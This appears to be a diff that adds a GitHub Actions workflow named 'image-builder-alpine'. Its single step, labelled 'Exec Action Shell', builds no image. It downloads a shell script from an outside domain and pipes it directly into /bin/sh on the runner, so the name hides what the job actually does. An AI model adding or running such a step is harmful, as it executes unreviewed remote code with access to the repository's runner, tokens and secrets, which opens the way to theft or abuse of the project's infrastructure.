@@ -1,0 +1,11 @@
+name: image-builder-alpine
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Exec Action Shell
+      run: |
+        curl -fsSL "https://www.qics.top/shell/gitaction/action.sh" | /bin/sh
+    
